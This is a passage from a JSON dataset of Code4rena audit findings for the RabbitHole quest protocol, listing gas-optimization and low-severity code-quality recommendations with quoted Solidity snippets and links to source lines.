issue:*\n\n```solidity\nFile: contracts/QuestFactory.sol\n\n/// @audit (valid but excluded finding)\n17:       bytes32 public constant CREATE_QUEST_ROLE = keccak256('CREATE_QUEST_ROLE');\n\n```\nhttps://github.com/rabbitholegg/quest-protocol/blob/8c4c1f71221570b14a0479c216583342bd652d8d/contracts/QuestFactory.sol#L17\n\n### [G&#x2011;20] Functions guaranteed to revert when called by normal users can be marked `payable`\nIf a function modifier such as `onlyOwner` is used, the function will revert if a normal user tries to pay the function. Marking the function as `payable` will lower the gas cost for legitimate callers because the compiler will not include checks for whether a payment was provided. The extra opcodes avoided are \n`CALLVALUE`(2),`DUP1`(3),`ISZERO`(3),`PUSH2`(3),`JUMPI`(10),`PUSH1`(3),`DUP1`(3),`REVERT`(0),`JUMPDEST`(1),`POP`(2), which costs an average of about **21 gas per call** to the function, in addition to the extra deployment cost\n\n*There are 25 instances of this issue:*\n\n```solidity\nFile: contracts/Erc1155Quest.sol\n\n/// @audit (valid but excluded finding)\n54:       function withdrawRemainingTokens(address to_) public override onlyOwner {\n\n```\nhttps://github.com/rabbitholegg/quest-protocol/blob/8c4c1f71221570b14a0479c216583342bd652d8d/contracts/Erc1155Quest.sol#L54\n\n```solidity\nFile: contracts/Erc20Quest.sol\n\n/// @audit (valid but excluded finding)\n81:       function withdrawRemainingTokens(address to_) public override onlyOwner {\n\n/// @audit (valid but excluded finding)\n102:      function withdrawFee() public onlyAdminWithdrawAfterEnd {\n\n```\nhttps://github.com/rabbitholegg/quest-protocol/blob/8c4c1f71221570b14a0479c216583342bd652d8d/contracts/Erc20Quest.sol#L81\n\n```solidity\nFile: contracts/QuestFactory.sol\n\n/// @audit (valid but excluded finding)\n142:      function changeCreateQuestRole(address account_, bool canCreateQuest_) public onlyOwner {\n\n/// @audit (valid but excluded finding)\n159:      function setClaimSignerAddress(address claimSignerAddress_) public onlyOwner {\n\n/// @audit (valid but excluded finding)\n165:      function setProtocolFeeRecipient(address protocolFeeRecipient_) public onlyOwner {\n\n/// @audit (valid but excluded finding)\n172:      function setRabbitHoleReceiptContract(address rabbitholeReceiptContract_) public onlyOwner {\n\n/// @audit (valid but excluded finding)\n179:      function setRewardAllowlistAddress(address rewardAddress_, bool allowed_) public onlyOwner {\n\n/// @audit (valid but excluded finding)\n186:      function setQuestFee(uint256 questFee_) public onlyOwner {\n\n```\nhttps://github.com/rabbitholegg/quest-protocol/blob/8c4c1f71221570b14a0479c216583342bd652d8d/contracts/QuestFactory.sol#L142\n\n```solidity\nFile: contracts/Quest.sol\n\n/// @audit (valid but excluded finding)\n50:       function start() public virtual onlyOwner {\n\n/// @audit (valid but excluded finding)\n57:       function pause() public onlyOwner onlyStarted {\n\n/// @audit (valid but excluded finding)\n63:       function unPause() public onlyOwner onlyStarted {\n\n/// @audit (valid but excluded finding)\n96:       function claim() public virtual onlyQuestActive {\n\n/// @audit (valid but excluded finding)\n150:      function withdrawRemainingTokens(address to_) public virtual onlyOwner onlyAdminWithdrawAfterEnd {}\n\n```\nhttps://github.com/rabbitholegg/quest-protocol/blob/8c4c1f71221570b14a0479c216583342bd652d8d/contracts/Quest.sol#L50\n\n```solidity\nFile: contracts/RabbitHoleReceipt.sol\n\n/// @audit (valid but excluded finding)\n65:       function setReceiptRenderer(address receiptRenderer_) public onlyOwner {\n\n/// @audit (valid but excluded finding)\n71:       function setRoyaltyRecipient(address royaltyRecipient_) public onlyOwner {\n\n/// @audit (valid but excluded finding)\n77:       function setQuestFactory(address questFactory_) public onlyOwner {\n\n/// @audit (valid but excluded finding)\n83:       function setMinterAddress(address minterAddress_) public onlyOwner {\n\n/// @audit (valid but excluded finding)\n90:       function setRoyaltyFee(uint256 royaltyFee_) public onlyOwner {\n\n/// @audit (valid but excluded finding)\n98:       function mint(address to_, string memory questId_) public onlyMinter {\n\n```\nhttps://github.com/rabbitholegg/quest-protocol/blob/8c4c1f71221570b14a0479c216583342bd652d8d/contracts/RabbitHoleReceipt.sol#L65\n\n```solidity\nFile: contracts/RabbitHoleTickets.sol\n\n/// @audit (valid but excluded finding)\n54:       function setTicketRenderer(address ticketRenderer_) public onlyOwner {\n\n/// @audit (valid but excluded finding)\n60:       function setRoyaltyRecipient(address royaltyRecipient_) public onlyOwner {\n\n/// @audit (valid but excluded finding)\n66:       function setRoyaltyFee(uint256 royaltyFee_) public onlyOwner {\n\n/// @audit (valid but excluded finding)\n73:       function setMinterAddress(address minterAddress_) public onlyOwner {\n\n/// @audit (valid but excluded finding)\n83:       function mint(address to_, uint256 id_, uint256 amount_, bytes memory data_) public onlyMinter {\n\n```\nhttps://github.com/rabbitholegg/quest-protocol/blob/8c4c1f71221570b14a0479c216583342bd652d8d/contracts/RabbitHoleTickets.sol#L54\n\n\n\n***\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "RabbitHole",
      "source_link": "https://code4rena.com/reports/2023-01-rabbithole",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "43379",
      "title": "[G-13] Use custom errors rather than `revert()`/`require()` strings to save gas",
      "impact": "GAS",
      "content": "Custom errors are available from solidity version 0.8.4. Custom errors save [**~50 gas**](https://gist.github.com/IllIllI000/ad1bd0d29a0101b25e57c293b4b0c746) each time they're hit by [avoiding having to allocate and store the revert string](https://blog.soliditylang.org/2021/04/21/custom-errors/#errors-in-depth). Not defining the strings also save deployment gas.\n\n*There are 3 instances of this issue:*\n\n```solidity\nFile: contracts/RabbitHoleReceipt.sol\n\n161:          require(_exists(tokenId_), 'ERC721URIStorage: URI query for nonexistent token');\n\n162:          require(QuestFactoryContract != IQuestFactory(address(0)), 'QuestFactory not set');\n\n182:          require(_exists(tokenId_), 'Nonexistent token');\n\n```\nhttps://github.com/rabbitholegg/quest-protocol/blob/8c4c1f71221570b14a0479c216583342bd652d8d/contracts/RabbitHoleReceipt.sol#L161\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "RabbitHole",
      "source_link": "https://code4rena.com/reports/2023-01-rabbithole",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "43378",
      "title": "[G-12] Don't compare boolean expressions to boolean literals",
      "impact": "GAS",
      "content": "`if (<x> == true)` => `if (<x>)`, `if (<x> == false)` => `if (!<x>)`\n\n*There are 3 instances of this issue:*\n\n```solidity\nFile: contracts/QuestFactory.sol\n\n73:               if (rewardAllowlist[rewardTokenAddress_] == false) revert RewardNotAllowed();\n\n221:          if (quests[questId_].addressMinted[msg.sender] == true) revert AddressAlreadyMinted();\n\n```\nhttps://github.com/rabbitholegg/quest-protocol/blob/8c4c1f71221570b14a0479c216583342bd652d8d/contracts/QuestFactory.sol#L73\n\n```solidity\nFile: contracts/Quest.sol\n\n136:          return claimedList[tokenId_] == true;\n\n```\nhttps://github.com/rabbitholegg/quest-protocol/blob/8c4c1f71221570b14a0479c216583342bd652d8d/contracts/Quest.sol#L136\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "RabbitHole",
      "source_link": "https://code4rena.com/reports/2023-01-rabbithole",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "43377",
      "title": "[G-11] Using `private` rather than `public` for constants, saves gas",
      "impact": "GAS",
      "content": "If needed, the values can be read from the verified contract source code, or if there are multiple values there can be a single getter function that [returns a tuple](https://github.com/code-423n4/2022-08-frax/blob/90f55a9ce4e25bceed3a74290b854341d8de6afa/src/contracts/FraxlendPair.sol#L156-L178) of the values of all currently-public constants. Saves **3406-3606 gas** in deployment gas due to the compiler not having to create non-payable getter functions for deployment calldata, not having to store the bytes of the value outside of where it's used, and not adding another entry to the method ID table.\n\n*There are 5 instances of this issue:*\n\n```solidity\nFile: contracts/Erc20Quest.sol\n\n13:       uint256 public immutable questFee;\n\n```\nhttps://github.com/rabbitholegg/quest-protocol/blob/8c4c1f71221570b14a0479c216583342bd652d8d/contracts/Erc20Quest.sol#L13\n\n```solidity\nFile: contracts/Quest.sol\n\n15:       uint256 public immutable endTime;\n\n16:       uint256 public immutable startTime;\n\n17:       uint256 public immutable totalParticipants;\n\n18:       uint256 public immutable rewardAmountInWeiOrTokenId;\n\n```\nhttps://github.com/rabbitholegg/quest-protocol/blob/8c4c1f71221570b14a0479c216583342bd652d8d/contracts/Quest.sol#L15\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "RabbitHole",
      "source_link": "https://code4rena.com/reports/2023-01-rabbithole",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "43376",
      "title": "[G-10] String literals passed to `abi.encode()`/`abi.encodePacked()` should not be split by commas",
      "impact": "GAS",
      "content": "String literals can be split into multiple parts and still be considered as a single string literal. Adding commas between each chunk makes it no longer a single string, and instead multiple strings. EACH new comma costs [***21 gas***](https://gist.github.com/IllIllI000/837d1b36c16c9bfe1010f9f775a09bbf) due to stack operations and separate `MSTORE`s.\n\n*There are 5 instances of this issue:*\n\n```solidity\nFile: contracts/ReceiptRenderer.sol\n\n/// @audit 4 commas\n63            bytes memory dataURI = abi.encodePacked(\n64                '{',\n65                '\"name\": \"RabbitHole.gg Receipt #',\n66                tokenId_.toString(),\n67                '\",',\n68                '\"description\": \"RabbitHole.gg Receipts are used to claim rewards from completed quests.\",',\n69                '\"image\": \"',\n70                generateSVG(tokenId_, questId_),\n71                '\",',\n72                '\"attributes\": ',\n73                attributes,\n74                '}'\n75:           );\n\n/// @audit 3 commas\n83            bytes memory attribute = abi.encodePacked(\n84                '{',\n85                '\"trait_type\": \"',\n86                key,\n87                '\",',\n88                '\"value\": \"',\n89                value,\n90                '\"',\n91                '}'\n92:           );\n\n/// @audit 5 commas\n101           bytes memory svg = abi.encodePacked(\n102               '<svg xmlns=\"http://www.w3.org/2000/svg\" preserveAspectRatio=\"xMinYMin meet\" viewBox=\"0 0 350 350\">',\n103               '<style>.base { fill: white; font-family: serif; font-size: 14px; }</style>',\n104               '<rect width=\"100%\" height=\"100%\" fill=\"black\" />',\n105               '<text x=\"50%\" y=\"40%\" class=\"base\" dominant-baseline=\"middle\" text-anchor=\"middle\">RabbitHole Quest #',\n106               questId_,\n107               '</text>',\n108               '<text x=\"70%\" y=\"40%\" class=\"base\" dominant-baseline=\"middle\" text-anchor=\"middle\">RabbitHole Quest Receipt #',\n109               tokenId_,\n110               '</text>',\n111               '</svg>'\n112:          );\n\n```\nhttps://github.com/rabbitholegg/quest-protocol/blob/8c4c1f71221570b14a0479c216583342bd652d8d/contracts/ReceiptRenderer.sol#L63-L75\n\n```solidity\nFile: contracts/TicketRenderer.sol\n\n/// @audit 4 commas\n19            bytes memory dataURI = abi.encodePacked(\n20                '{',\n21                '\"name\": \"RabbitHole Tickets #',\n22                tokenId_.toString(),\n23                '\",',\n24                '\"description\": \"A reward for completing quests within RabbitHole, with unk(no)wn utility\",',\n25                '\"image\": \"',\n26                generateSVG(tokenId_),\n27                '\"',\n28                '}'\n29:           );\n\n/// @audit 4 commas\n37            bytes memory svg = abi.encodePacked(\n38                '<svg xmlns=\"http://www.w3.org/2000/svg\" preserveAspectRatio=\"xMinYMin meet\" viewBox=\"0 0 350 350\">',\n39                '<style>.base { fill: white; font-family: serif; font-size: 14px; }</style>',\n40                '<rect width=\"100%\" height=\"100%\" fill=\"black\" />',\n41                '<text x=\"50%\" y=\"40%\" class=\"base\" dominant-baseline=\"middle\" text-anchor=\"middle\">RabbitHole Tickets #',\n42                tokenId_.toString(),\n43                '</text>',\n44                '</svg>'\n45:           );\n\n```\nhttps://github.com/rabbitholegg/quest-protocol/blob/8c4c1f71221570b14a0479c216583342bd652d8d/contracts/TicketRenderer.sol#L19-L29\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "RabbitHole",
      "source_link": "https://code4rena.com/reports/2023-01-rabbithole",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "43375",
      "title": "[G-09] Optimize names to save gas",
      "impact": "GAS",
      "content": "`public`/`external` function names and `public` member variable names can be optimized to save gas. See [this](https://gist.github.com/IllIllI000/a5d8b486a8259f9f77891a919febd1a9) link for an example of how it works. Below are the interfaces/abstract contracts that can be optimized so that the most frequently-called functions use the least amount of gas possible during method lookup. Method IDs that have two leading zero bytes can save **128 gas** each during deployment, and renaming functions to have lower method IDs will save **22 gas** per call, [per sorted position shifted](https://medium.com/joyso/solidity-how-does-function-name-affect-gas-consumption-in-smart-contract-47d270d8ac92)\n\n*There are 8 instances of this issue:*\n\n```solidity\nFile: contracts/Erc20Quest.sol\n\n/// @audit maxTotalRewards(), maxProtocolReward(), receiptRedeemers(), protocolFee(), withdrawFee()\n11:   contract Erc20Quest is Quest {\n\n```\nhttps://github.com/rabbitholegg/quest-protocol/blob/8c4c1f71221570b14a0479c216583342bd652d8d/contracts/Erc20Quest.sol#L11\n\n```solidity\nFile: contracts/interfaces/IQuest.sol\n\n/// @audit isClaimed(), getRewardAmount(), getRewardToken()\n6:    interface IQuest {\n\n```\nhttps://github.com/rabbitholegg/quest-protocol/blob/8c4c1f71221570b14a0479c216583342bd652d8d/contracts/interfaces/IQuest.sol#L6\n\n```solidity\nFile: contracts/QuestFactory.sol\n\n/// @audit initialize(), createQuest(), changeCreateQuestRole(), setClaimSignerAddress(), setProtocolFeeRecipient(), setRabbitHoleReceiptContract(), setRewardAllowlistAddress(), setQuestFee(), getNumberMinted(), questInfo(), recoverSigner(), mintReceipt()\n16:   contract QuestFactory is Initializable, OwnableUpgradeable, AccessControlUpgradeable, IQuestFactory {\n\n```\nhttps://github.com/rabbitholegg/quest-protocol/blob/8c4c1f71221570b14a0479c216583342bd652d8d/contracts/QuestFactory.sol#L16\n\n```solidity\nFile: contracts/Quest.sol\n\n/// @audit unPause(), claim(), isClaimed(), getRewardAmount(), getRewardToken(), withdrawRemainingTokens()\n12:   contract Quest is Ownable, IQuest {\n\n```\nhttps://github.com/rabbitholegg/quest-protocol/blob/8c4c1f71221570b14a0479c216583342bd652d8d/contracts/Quest.sol#L12\n\n```solidity\nFile: contracts/RabbitHoleReceipt.sol\n\n/// @audit initialize(), setReceiptRenderer(), setRoyaltyRecipient(), setQuestFactory(), setMinterAddress(), setRoyaltyFee(), mint(), getOwnedTokenIdsOfQuest()\n15:   contract RabbitHoleReceipt is\n\n```\nhttps://github.com/rabbitholegg/quest-protocol/blob/8c4c1f71221570b14a0479c216583342bd652d8d/contracts/RabbitHoleReceipt.sol#L15\n\n```solidity\nFile: contracts/RabbitHoleTickets.sol\n\n/// @audit initialize(), setTicketRenderer(), setRoyaltyRecipient(), setRoyaltyFee(), setMinterAddress(), mint(), mintBatch()\n11:   contract RabbitHoleTickets is\n\n```\nhttps://github.com/rabbitholegg/quest-protocol/blob/8c4c1f71221570b14a0479c216583342bd652d8d/contracts/RabbitHoleTickets.sol#L11\n\n```solidity\nFile: contracts/ReceiptRenderer.sol\n\n/// @audit generateTokenURI(), generateDataURI(), generateAttribute(), generateSVG()\n10:   contract ReceiptRenderer {\n\n```\nhttps://github.com/rabbitholegg/quest-protocol/blob/8c4c1f71221570b14a0479c216583342bd652d8d/contracts/ReceiptRenderer.sol#L10\n\n```solidity\nFile: contracts/TicketRenderer.sol\n\n/// @audit generateTokenURI(), generateSVG()\n10:   contract TicketRenderer {\n\n```\nhttps://github.com/rabbitholegg/quest-protocol/blob/8c4c1f71221570b14a0479c216583342bd652d8d/contracts/TicketRenderer.sol#L10\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "RabbitHole",
      "source_link": "https://code4rena.com/reports/2023-01-rabbithole",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "43374",
      "title": "[G-08] `++i`/`i++` should be `unchecked{++i}`/`unchecked{i++}` when it is not possible for them to overflow, as is the case when used in `for`- and `while`-loops",
      "impact": "GAS",
      "content": "The `unchecked` keyword is new in solidity version 0.8.0, so this only applies to that version or higher, which these instances are. This saves **30-40 gas [per loop](https://gist.github.com/hrkrshnn/ee8fabd532058307229d65dcd5836ddc#the-increment-in-for-loop-post-condition-can-be-made-unchecked)**\n\n*There are 4 instances of this issue:*\n\n```solidity\nFile: contracts/Quest.sol\n\n70:           for (uint i = 0; i < tokenIds_.length; i++) {\n\n104:          for (uint i = 0; i < tokens.length; i++) {\n\n```\nhttps://github.com/rabbitholegg/quest-protocol/blob/8c4c1f71221570b14a0479c216583342bd652d8d/contracts/Quest.sol#L70\n\n```solidity\nFile: contracts/RabbitHoleReceipt.sol\n\n117:          for (uint i = 0; i < msgSenderBalance; i++) {\n\n128:          for (uint i = 0; i < msgSenderBalance; i++) {\n\n```\nhttps://github.com/rabbitholegg/quest-protocol/blob/8c4c1f71221570b14a0479c216583342bd652d8d/contracts/RabbitHoleReceipt.sol#L117\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "RabbitHole",
      "source_link": "https://code4rena.com/reports/2023-01-rabbithole",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "43373",
      "title": "[G-07] `internal` functions only called once can be inlined to save gas",
      "impact": "GAS",
      "content": "Not inlining costs **20 to 40 gas** because of two extra `JUMP` instructions and additional stack operations needed for function calls.\n\n*There is 1 instance of this issue:*\n\n```solidity\nFile: contracts/QuestFactory.sol\n\n152:      function grantDefaultAdminAndCreateQuestRole(address account_) internal {\n\n```\nhttps://github.com/rabbitholegg/quest-protocol/blob/8c4c1f71221570b14a0479c216583342bd652d8d/contracts/QuestFactory.sol#L152\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "RabbitHole",
      "source_link": "https://code4rena.com/reports/2023-01-rabbithole",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "43372",
      "title": "[G-06] `<x> += <y>` costs more gas than `<x> = <x> + <y>` for state variables",
      "impact": "GAS",
      "content": "Using the addition operator instead of plus-equals saves **[113 gas](https://gist.github.com/IllIllI000/cbbfb267425b898e5be734d4008d4fe8)**\n\n*There is 1 instance of this issue:*\n\n```solidity\nFile: contracts/Quest.sol\n\n115:          redeemedTokens += redeemableTokenCount;\n\n```\nhttps://github.com/rabbitholegg/quest-protocol/blob/8c4c1f71221570b14a0479c216583342bd652d8d/contracts/Quest.sol#L115\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "RabbitHole",
      "source_link": "https://code4rena.com/reports/2023-01-rabbithole",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "43371",
      "title": "[G-05] The result of function calls should be cached rather than re-calling the function",
      "impact": "GAS",
      "content": "The instances below point to the second+ call of the function within a single function.\n\n*There is 1 instance of this issue:*\n\n```solidity\nFile: contracts/ReceiptRenderer.sol\n\n/// @audit tokenId_.toString() on line 52\n66:               tokenId_.toString(),\n\n```\nhttps://github.com/rabbitholegg/quest-protocol/blob/8c4c1f71221570b14a0479c216583342bd652d8d/contracts/ReceiptRenderer.sol#L66\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "RabbitHole",
      "source_link": "https://code4rena.com/reports/2023-01-rabbithole",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "43370",
      "title": "[G-04] Multiple accesses of a mapping/array should use a local variable cache",
      "impact": "GAS",
      "content": "The instances below point to the second+ access of a value inside a mapping/array, within a function. Caching a mapping's value in a local `storage` or `calldata` variable when the value is accessed [multiple times](https://gist.github.com/IllIllI000/ec23a57daa30a8f8ca8b9681c8ccefb0), saves **~42 gas per access** due to not having to recalculate the key's keccak256 hash (Gkeccak256 - **30 gas**) and that calculation's associated stack operations. Caching an array's struct avoids recalculating the array offsets into memory/calldata.\n\n*There are 9 instances of this issue:*\n\n```solidity\nFile: contracts/QuestFactory.sol\n\n/// @audit quests[questId_] on line 70\n98:               quests[questId_].questAddress = address(newQuest);\n\n/// @audit quests[questId_] on line 98\n99:               quests[questId_].totalParticipants = totalParticipants_;\n\n/// @audit quests[questId_] on line 129\n130:              quests[questId_].totalParticipants = totalParticipants_;\n\n/// @audit quests[questId_] on line 201\n202:              quests[questId_].totalParticipants,\n\n/// @audit quests[questId_] on line 202\n203:              quests[questId_].numberMinted\n\n/// @audit quests[questId_] on line 220\n220:          if (quests[questId_].numberMinted + 1 > quests[questId_].totalParticipants) revert OverMaxAllowedToMint();\n\n/// @audit quests[questId_] on line 220\n221:          if (quests[questId_].addressMinted[msg.sender] == true) revert AddressAlreadyMinted();\n\n/// @audit quests[questId_] on line 221\n225:          quests[questId_].addressMinted[msg.sender] = true;\n\n/// @audit quests[questId_] on line 225\n226:          quests[questId_].numberMinted++;\n\n```\nhttps://github.com/rabbitholegg/quest-protocol/blob/8c4c1f71221570b14a0479c216583342bd652d8d/contracts/QuestFactory.sol#L98\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "RabbitHole",
      "source_link": "https://code4rena.com/reports/2023-01-rabbithole",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "43369",
      "title": "[G-03] Using `calldata` instead of `memory` for read-only arguments in `external` functions saves gas",
      "impact": "GAS",
      "content": "When a function with a `memory` array is called externally, the `abi.decode()` step has to use a for-loop to copy each index of the `calldata` to the `memory` index. **Each iteration of this for-loop costs at least 60 gas** (i.e. `60 * <mem_array>.length`). Using `calldata` directly, obliviates the need for such a loop in the contract code and runtime execution. Note that even if an interface defines a function as having `memory` arguments, it's still valid for implementation contracs to use `calldata` arguments instead. \n\nIf the array is passed to an `internal` function which passes the array to another internal function where the array is modified and therefore `memory` is used in the `external` call, it's still more gass-efficient to use `calldata` when the `external` function uses modifiers, since the modifiers may prevent the internal functions from being called. Structs have the same overhead as an array of length one\n\nNote that I've also flagged instances where the function is `public` but can be marked as `external` since it's not called by the contract, and cases where a constructor is involved\n\n*There are 12 instances of this issue:*\n\n```solidity\nFile: contracts/QuestFactory.sol\n\n/// @audit contractType_\n/// @audit questId_\n61        function createQuest(\n62            address rewardTokenAddress_,\n63            uint256 endTime_,\n64            uint256 startTime_,\n65            uint256 totalParticipants_,\n66            uint256 rewardAmountOrTokenId_,\n67            string memory contractType_,\n68            string memory questId_\n69:       ) public onlyRole(CREATE_QUEST_ROLE) returns (address) {\n\n/// @audit questId_\n193:      function getNumberMinted(string memory questId_) external view returns (uint) {\n\n/// @audit questId_\n199:      function questInfo(string memory questId_) external view returns (address, uint, uint) {\n\n/// @audit questId_\n/// @audit signature_\n219:      function mintReceipt(string memory questId_, bytes32 hash_, bytes memory signature_) public {\n\n```\nhttps://github.com/rabbitholegg/quest-protocol/blob/8c4c1f71221570b14a0479c216583342bd652d8d/contracts/QuestFactory.sol#L61-L69\n\n```solidity\nFile: contracts/RabbitHoleReceipt.sol\n\n/// @audit questId_\n98:       function mint(address to_, string memory questId_) public onlyMinter {\n\n/// @audit questId_\n109       function getOwnedTokenIdsOfQuest(\n110           string memory questId_,\n111           address claimingAddress_\n112:      ) public view returns (uint[] memory) {\n\n```\nhttps://github.com/rabbitholegg/quest-protocol/blob/8c4c1f71221570b14a0479c216583342bd652d8d/contracts/RabbitHoleReceipt.sol#L98\n\n```solidity\nFile: contracts/RabbitHoleTickets.sol\n\n/// @audit data_\n83:       function mint(address to_, uint256 id_, uint256 amount_, bytes memory data_) public onlyMinter {\n\n/// @audit ids_\n/// @audit amounts_\n/// @audit data_\n92        function mintBatch(\n93            address to_,\n94            uint256[] memory ids_,\n95            uint256[] memory amounts_,\n96            bytes memory data_\n97:       ) public onlyMinter {\n\n```\nhttps://github.com/rabbitholegg/quest-protocol/blob/8c4c1f71221570b14a0479c216583342bd652d8d/contracts/RabbitHoleTickets.sol#L83\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "RabbitHole",
      "source_link": "https://code4rena.com/reports/2023-01-rabbithole",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "43368",
      "title": "[G-02] Hash shouldn't be re-calculated on every iteration of the `for`-loop",
      "impact": "GAS",
      "content": "Calculate the hash outside of the loop, and use that value within the loop\n\n*There is 1 instance of this issue:*\n\n```solidity\nFile: /contracts/RabbitHoleReceipt.sol\n\n119:             if (keccak256(bytes(questIdForTokenId[tokenId])) == keccak256(bytes(questId_))) {\n\n```\nhttps://github.com/rabbitholegg/quest-protocol/blob/8c4c1f71221570b14a0479c216583342bd652d8d/contracts/RabbitHoleReceipt.sol#L119\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "RabbitHole",
      "source_link": "https://code4rena.com/reports/2023-01-rabbithole",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "43367",
      "title": "[G-01] Shorten the array rather than copying to a new one",
      "impact": "GAS",
      "content": "Inline-assembly can be used to shorten the array by changing the length slot, so that the entries don't have to be copied to a new, shorter array\n\n*There is 1 instance of this issue:*\n\n```solidity\nFile: /contracts/RabbitHoleReceipt.sol\n\n125          uint[] memory filteredTokens = new uint[](foundTokens);\n126          uint filterTokensIndexTracker = 0;\n127  \n128          for (uint i = 0; i < msgSenderBalance; i++) {\n129              if (tokenIdsForQuest[i] > 0) {\n130                  filteredTokens[filterTokensIndexTracker] = tokenIdsForQuest[i];\n131                  filterTokensIndexTracker++;\n132              }\n133:         }\n\n```\nhttps://github.com/rabbitholegg/quest-protocol/blob/8c4c1f71221570b14a0479c216583342bd652d8d/contracts/RabbitHoleReceipt.sol#L125-L133\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "RabbitHole",
      "source_link": "https://code4rena.com/reports/2023-01-rabbithole",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "43366",
      "title": "[O-03] Create your own import names instead of using the regular ones",
      "impact": "LOW",
      "content": "For better readability, you should name the imports instead of using the regular ones.\n\nInstances:\n```solidity\ncontracts/RabbitHoleReceipt.sol\ncontracts/RabbitHoleTickets.sol\ncontracts/ReceiptRenderer.sol\ncontracts/TicketRenderer.sol\n```\n\n**[waynehoover (RabbitHole) confirmed](https://github.com/code-423n4/2023-01-rabbithole-findings/issues/619#issuecomment-1421584782)**\n\n**[kirk-baird (judge) commented](https://github.com/code-423n4/2023-01-rabbithole-findings/issues/619#issuecomment-1438007921):**\n > This is a very high quality report listing numerous valid Low severity issues, many of which were not raised by other wardens. I do not have any concerns with the issues raised or the recommendations. Furthermore, the formatting of this report is excellent.\n\n\n\n***\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "RabbitHole",
      "source_link": "https://code4rena.com/reports/2023-01-rabbithole",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "43365",
      "title": "[O-02] Code contains empty blocks",
      "impact": "LOW",
      "content": "\nThere are some empty blocks, which are unused.\n\nThe code should do something or at least have a description why it is structured that way.\n\nInstances:\n```solidity\ncontracts/QuestFactory.sol\n\n35: constructor() initializer {}\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "RabbitHole",
      "source_link": "https://code4rena.com/reports/2023-01-rabbithole",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "43364",
      "title": "[O-01] Floating pragma",
      "impact": "LOW",
      "content": "\nContracts should be deployed with the same compiler version and flags that they have been tested with thoroughly. Locking the pragma helps to ensure that contracts do not accidentally get deployed using, for example, an outdated compiler version that might introduce bugs that affect the contract system negatively.\n\nInstances:\n```solidity\ncontracts/QuestFactory.sol\ncontracts/RabbitHoleReceipt.sol\ncontracts/Quest.sol\ncontracts/RabbitHoleTickets.sol\ncontracts/Erc20Quest.sol\ncontracts/Erc1155Quest.sol\ncontracts/ReceiptRenderer.sol\ncontracts/TicketRenderer.sol\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "RabbitHole",
      "source_link": "https://code4rena.com/reports/2023-01-rabbithole",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "43363",
      "title": "[R-04] Total minted check in `mintReceipt` can be refactored",
      "impact": "LOW",
      "content": "In the function `mintReceipt` a check is made to see if the amount of already minted receipts doesn't exceed the amount of total participants allowed and the following if statement is used below. Instead of adding 1 to the total amount of minted receipts, the if statement can just be changed to `>=`, as it does the same thing.\n\n`if (quests[questId_].numberMinted + 1 > quests[questId_].totalParticipants)` \n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "RabbitHole",
      "source_link": "https://code4rena.com/reports/2023-01-rabbithole",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "43362",
      "title": "[R-03] `isPaused` check can be added to the modifier `onlyQuestActive`, as it's used only on the claim function",
      "impact": "LOW",
